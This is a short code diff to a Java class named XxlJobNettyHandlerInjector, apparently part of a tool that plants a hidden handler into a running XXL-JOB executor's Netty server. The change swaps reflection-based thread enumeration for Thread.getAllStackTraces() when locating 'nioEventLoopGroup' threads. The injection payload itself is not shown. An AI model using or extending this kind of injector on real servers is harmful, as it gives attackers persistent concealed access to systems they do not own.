@@ -15,6 +15,7 @@ import java.io.IOException;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.HashSet;
+import java.util.Set;
 import java.util.concurrent.LinkedBlockingQueue;
 import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
@@ -81,11 +82,8 @@ public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel
     }
 
     public void inject() throws Exception {
-        ThreadGroup group = Thread.currentThread().getThreadGroup();
-        Field threads = group.getClass().getDeclaredField("threads");
-        threads.setAccessible(true);
-        Thread[] allThreads = (Thread[]) threads.get(group);
-        for (Thread thread : allThreads) {
+        Set<Thread> threads = Thread.getAllStackTraces().keySet();
+        for (Thread thread : threads) {
             if (thread != null && thread.getName().contains("nioEventLoopGroup")) {
                 Object target;
 
